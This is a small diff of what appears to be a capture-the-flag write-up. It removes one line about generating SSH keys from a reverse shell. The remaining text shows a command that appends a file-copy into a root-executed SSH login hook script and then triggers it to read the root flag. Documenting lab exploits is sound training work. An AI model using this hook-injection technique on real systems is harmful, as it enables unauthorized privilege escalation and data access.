@@ -82,7 +82,6 @@ fi
 If you login with ssh , this script will be execute as root .
 
 # Root
-From the reverse shell session generate ssh keys and save the private key (id_rsa) to our machine.
 ```
 echo 'cat /root/root.txt > /tmp/root.txt' >> /usr/local/sbin/ssh-alert.sh;ssh localhost "e
 xit"; cat /tmp/root.txt
